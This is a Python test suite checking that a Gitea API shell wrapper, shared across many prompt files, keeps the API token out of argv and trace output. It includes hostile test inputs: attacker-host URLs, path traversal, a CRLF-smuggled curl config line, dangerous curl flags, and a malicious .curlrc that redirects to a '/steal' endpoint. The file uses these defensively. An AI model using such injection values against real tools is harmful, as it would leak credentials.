from __future__ import annotations

import os
import re
import stat
import subprocess
import tempfile
import textwrap
import threading
import unittest
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
FUNCTION = re.compile(
    r"^(?P<indent>[ \t]*)gitea_api\(\) \(\n.*?^(?P=indent)\)",
    re.DOTALL | re.MULTILINE,
)


class GiteaAPIWrapperTests(unittest.TestCase):
    def wrappers(self) -> set[str]:
        snippets = set()
        prompts = []
        for prompt in (ROOT / "dev-lead").rglob("*.md"):
            text = prompt.read_text(encoding="utf-8")
            if "gitea_api() (" not in text:
                continue
            prompts.append(prompt)
            function = FUNCTION.search(text)
            self.assertIsNotNone(function, prompt)
            snippets.add(textwrap.dedent(function.group(0)))
        self.assertEqual(len(prompts), 53, "the imported wrapper inventory changed")
        return snippets

    @staticmethod
    def fake_curl(path: Path) -> None:
        path.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            "printf 'call\\n' >> \"$CURL_CALL_LOG\"\n"
            "args=(\"$@\")\n"
            "for ((i=0; i<${#args[@]}; i++)); do\n"
            "  printf '<%s>\\n' \"${args[$i]}\" >> \"$CURL_ARGV_LOG\"\n"
            "  if [ \"${args[$i]}\" = --config ]; then\n"
            "    source=${args[$((i + 1))]}\n"
            "    if [ \"$source\" = - ]; then cat > \"$CURL_CONFIG_LOG\"; else cat \"$source\" > \"$CURL_CONFIG_LOG\"; fi\n"
            "  fi\n"
            "done\n"
            "printf '{\"ok\":true}\\n'\n"
        )
        path.chmod(path.stat().st_mode | stat.S_IXUSR)

    def test_all_imported_prompts_use_one_wrapper(self) -> None:
        snippets = self.wrappers()
        self.assertEqual(len(snippets), 1)

    def test_wrapper_keeps_token_out_of_argv_and_xtrace(self) -> None:
        snippets = self.wrappers()
        self.assertEqual(len(snippets), 1)
        snippet = snippets.pop()
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            fake_bin = root / "bin"
            fake_bin.mkdir()
            fake_curl = fake_bin / "curl"
            self.fake_curl(fake_curl)
            script = root / "probe.sh"
            script.write_text(
                snippet
                + "\ngitea_api POST 'repos/molecule-ai/internal' '{}'\n"
            )

            sentinel = "dummy-api-token-must-not-leak"
            argv_log = root / "argv.log"
            config_log = root / "config.log"
            call_log = root / "call.log"
            env = os.environ.copy()
            env.update(
                PATH=f"{fake_bin}:{env['PATH']}",
                GITEA_TOKEN=sentinel,
                CURL_ARGV_LOG=str(argv_log),
                CURL_CONFIG_LOG=str(config_log),
                CURL_CALL_LOG=str(call_log),
            )
            result = subprocess.run(
                ["bash", "-x", str(script)],
                text=True,
                capture_output=True,
                env=env,
                check=False,
            )

            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            config = config_log.read_text()
            self.assertIn(f'header = "Authorization: token {sentinel}"', config)
            self.assertIn('header = "Content-Type: application/json"', config)
            self.assertNotIn(sentinel, argv_log.read_text())
            self.assertNotIn(sentinel, result.stdout + result.stderr)
            argv = argv_log.read_text()
            self.assertEqual(argv.splitlines()[0], "<-q>")
            self.assertIn("<POST>", argv)
            self.assertIn("<--data-binary>", argv)
            self.assertIn(
                "<https://git.moleculesai.app/api/v1/repos/molecule-ai/internal>",
                argv,
            )

    def test_wrapper_rejects_all_curl_escape_hatches_before_auth(self) -> None:
        snippets = self.wrappers()
        self.assertEqual(len(snippets), 1)
        snippet = snippets.pop()
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            fake_bin = root / "bin"
            fake_bin.mkdir()
            self.fake_curl(fake_bin / "curl")
            script = root / "reject.sh"
            script.write_text(
                snippet
                + "\nreject() { if gitea_api \"$@\"; then exit 90; fi; }\n"
                + "reject GET 'https://attacker.invalid/api'\n"
                + "reject GET '//attacker.invalid/api'\n"
                + "reject GET '../admin/users'\n"
                + "reject GET 'repos/%252e%252e/admin/users'\n"
                + "reject GET $'repos/molecule-ai/internal\\r\\nurl = https://attacker.invalid'\n"
                + "reject GET 'repos/molecule-ai/internal' 'https://attacker.invalid' extra\n"
                + "reject GET 'repos/molecule-ai/internal' --location\n"
                + "reject GET 'repos/molecule-ai/internal' --proxy\n"
                + "reject GET 'repos/molecule-ai/internal' --config\n"
                + "reject GET 'repos/molecule-ai/internal' --output\n"
                + "reject GET 'repos/molecule-ai/internal' --upload-file\n"
            )
            sentinel = "dummy-api-token-must-not-leak"
            call_log = root / "call.log"
            env = os.environ.copy()
            env.update(
                PATH=f"{fake_bin}:{env['PATH']}",
                GITEA_TOKEN=sentinel,
                CURL_ARGV_LOG=str(root / "argv.log"),
                CURL_CONFIG_LOG=str(root / "config.log"),
                CURL_CALL_LOG=str(call_log),
            )

            result = subprocess.run(
                ["bash", "-x", str(script)],
                text=True,
                capture_output=True,
                env=env,
                check=False,
            )

            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertFalse(call_log.exists(), "curl ran for a rejected request")
            self.assertNotIn(sentinel, result.stdout + result.stderr)
            self.assertNotIn("attacker.invalid", (root / "argv.log").read_text() if (root / "argv.log").exists() else "")

    def test_wrapper_ignores_malicious_default_curlrc_with_real_curl(self) -> None:
        snippets = self.wrappers()
        self.assertEqual(len(snippets), 1)
        snippet = snippets.pop()
        target_requests: list[tuple[str, str | None]] = []
        attacker_requests: list[tuple[str, str | None]] = []

        def serve(records: list[tuple[str, str | None]]):
            class Handler(BaseHTTPRequestHandler):
                def do_GET(self) -> None:
                    records.append((self.path, self.headers.get("Authorization")))
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.send_header("Content-Length", "2")
                    self.end_headers()
                    self.wfile.write(b"{}")

                def log_message(self, _format: str, *_args: object) -> None:
                    return

            server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
            thread = threading.Thread(target=server.serve_forever, daemon=True)
            thread.start()
            return server, thread

        target, target_thread = serve(target_requests)
        attacker, attacker_thread = serve(attacker_requests)
        try:
            with tempfile.TemporaryDirectory() as directory:
                root = Path(directory)
                target_base = f"http://127.0.0.1:{target.server_port}/api/v1/"
                local_snippet = snippet.replace(
                    "https://git.moleculesai.app/api/v1/", target_base
                )
                (root / ".curlrc").write_text(
                    f'url = "http://127.0.0.1:{attacker.server_port}/steal"\n',
                    encoding="utf-8",
                )
                script = root / "real-curl.sh"
                script.write_text(
                    local_snippet
                    + "\ngitea_api GET 'repos/molecule-ai/internal'\n",
                    encoding="utf-8",
                )
                sentinel = "dummy-api-token-must-not-leak"
                env = os.environ.copy()
                env.update(
                    HOME=str(root),
                    CURL_HOME=str(root),
                    GITEA_TOKEN=sentinel,
                    NO_PROXY="127.0.0.1",
                    no_proxy="127.0.0.1",
                )

                result = subprocess.run(
                    ["bash", "-x", str(script)],
                    text=True,
                    capture_output=True,
                    env=env,
                    timeout=10,
                    check=False,
                )

                self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
                self.assertEqual(
                    target_requests,
                    [("/api/v1/repos/molecule-ai/internal", f"token {sentinel}")],
                )
                self.assertEqual(attacker_requests, [])
                self.assertNotIn(sentinel, result.stdout + result.stderr)
        finally:
            target.shutdown()
            attacker.shutdown()
            target.server_close()
            attacker.server_close()
            target_thread.join(timeout=5)
            attacker_thread.join(timeout=5)


if __name__ == "__main__":
    unittest.main()
